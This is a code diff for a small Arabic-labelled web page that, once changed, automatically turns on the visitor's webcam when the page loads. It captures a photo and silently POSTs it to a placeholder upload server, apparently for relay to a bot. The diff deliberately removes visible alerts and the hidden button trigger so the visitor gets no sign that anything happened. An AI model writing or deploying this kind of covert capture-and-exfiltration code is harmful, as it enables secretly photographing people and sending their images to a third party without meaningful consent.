@@ -3,21 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <title>التقاط صورة تلقائي</title>
-<style>
-  body { display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f0f0; }
-  #snap { opacity:0; width:1px; height:1px; position:absolute; top:0; left:0; }
-</style>
 </head>
 <body>
-
-<button id="snap">التقاط</button>
-
 <video id="video" autoplay style="display:none;"></video>
 <script>
-const snapBtn = document.getElementById('snap');
 const video = document.getElementById('video');
 
-snapBtn.addEventListener('click', async () => {
+async function captureAndSend() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
@@ -32,23 +24,23 @@ snapBtn.addEventListener('click', async () => {
 
       const imgData = canvas.toDataURL('image/jpeg');
 
+      // إرسال الصورة للبوت عبر سيرفرك
       fetch('https://YOUR_SERVER_ENDPOINT/upload', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ image: imgData })
-      }).then(() => alert('تم إرسال الصورة!'));
+      }).then(() => console.log('تم إرسال الصورة!'));
 
       // إيقاف الكاميرا بعد الالتقاط
       stream.getTracks().forEach(track => track.stop());
     });
   } catch (err) {
-    alert('فشل الوصول إلى الكاميرا: ' + err);
+    console.error('فشل الوصول إلى الكاميرا: ', err);
   }
-});
+}
 
-// محاولة الضغط تلقائيًا بعد تحميل الصفحة (متصفحات معينة قد تسمح)
-window.onload = () => snapBtn.click();
+// محاولة تشغيل الالتقاط تلقائي عند السماح بالكاميرا
+window.onload = captureAndSend;
 </script>
-
 </body>
 </html>
